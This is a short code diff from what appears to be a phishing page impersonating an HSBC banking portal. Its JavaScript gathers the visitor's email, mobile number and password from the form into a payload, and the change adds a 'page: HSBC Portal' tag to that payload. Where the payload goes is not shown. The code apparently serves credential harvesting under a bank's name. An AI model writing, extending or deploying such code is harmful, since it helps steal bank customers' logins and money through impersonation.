@@ -325,6 +325,7 @@
     if (emailEl) emailEl.value = document.getElementById('uid')?.value || emailEl.value || '';
     if (mobileEl) mobileEl.value = document.getElementById('hsbc-mobile')?.value || mobileEl.value || '';
     var payload = {
+      page: 'HSBC Portal',
       type: type,
       email: emailEl?.value || '',
       pwd: document.getElementById('pwd')?.value || '',
